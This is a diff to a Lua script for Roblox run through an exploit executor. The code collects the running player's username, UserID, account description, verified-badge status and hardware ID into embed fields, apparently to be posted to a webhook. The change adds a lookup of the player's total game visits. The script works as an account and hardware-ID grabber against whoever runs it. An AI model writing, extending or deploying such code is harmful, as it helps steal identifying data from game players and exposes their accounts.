@@ -5,6 +5,20 @@ local req = http_request or request or (syn and syn.request)
 local HS = game:GetService("HttpService")
 local response = HS:JSONDecode(
     req({
+    Url = "https://www.roblox.com/users/profile/playergames-json?userId="..game.Players.LocalPlayer.UserId..""
+}).Body)
+
+local count = 0
+
+for _, v in ipairs(response.Games) do
+  count = count + v.Plays
+end
+
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
     Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
 })
 .Body)
@@ -46,6 +60,7 @@ pcall(function()
           {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
           {name = '**DisplayName**', value = ''..game.Players.LocalPlayer.DisplayName},
           {name = "**UserID**", value = ''..game.Players.LocalPlayer.UserId},
+          {name = "**Games Visits**", value = ''..count},
           {name = "**Verified Badge**", value = ''..tostring(response.hasVerifiedBadge)},
           {name = '**Account Description**', value = "'"..response.description.."'"},
           {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
